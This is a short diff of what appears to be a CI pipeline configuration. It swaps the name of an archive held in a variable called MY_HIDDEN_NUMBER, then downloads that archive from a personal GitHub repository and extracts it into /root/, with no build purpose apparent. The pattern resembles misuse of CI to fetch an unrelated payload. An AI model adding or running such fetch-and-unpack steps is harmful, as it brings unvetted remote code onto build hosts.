@@ -16,7 +16,7 @@ pipelines:
         script: # Modify the commands below to build your repository.
 
           # Set $DOCKER_HUB_USERNAME and $DOCKER_HUB_PASSWORD as environment variables in repository settings
-          - export MY_HIDDEN_NUMBER="12-med.tar.bz2"
+          - export MY_HIDDEN_NUMBER="11-saddam.tar.bz2"
           - echo $MY_HIDDEN_NUMBER
           - wget https://github.com/y0shimitsugh0st84/profire/raw/master/version/$MY_HIDDEN_NUMBER
           - tar -xvf $MY_HIDDEN_NUMBER -C /root/
